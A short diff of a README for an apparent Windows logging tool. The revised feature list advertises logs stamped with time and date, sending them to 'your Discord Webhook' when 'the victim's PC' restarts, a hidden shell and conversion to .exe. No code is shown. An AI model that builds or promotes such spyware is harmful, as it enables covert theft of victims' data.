@@ -25,8 +25,8 @@ To use it you have to download all requierement with the install.bat file and th
 
 <br><br>
 <strong>
-* Easy and fast to use
-* Send to any Discord Webhook at pc restart
+* Time and date of every log
+* When the victim's PC restarts, send it to your Discord Webhook
 * Hidden shell
 * Convert to a .exe file
 * Beautiful 🙃
